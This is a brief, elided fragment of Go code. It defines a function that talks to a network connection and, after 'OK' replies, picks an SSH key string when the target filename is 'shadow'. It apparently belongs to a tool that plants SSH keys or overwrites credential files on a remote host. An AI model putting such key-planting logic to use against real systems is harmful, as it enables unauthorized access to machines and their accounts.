...
func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	...
	if strings.Contains(text, "OK") {
		...
		if strings.Contains(text, "OK") {
			var key string
			if filename == "shadow" {
				key = "ssh-rsa  sysadmin"
			} else {
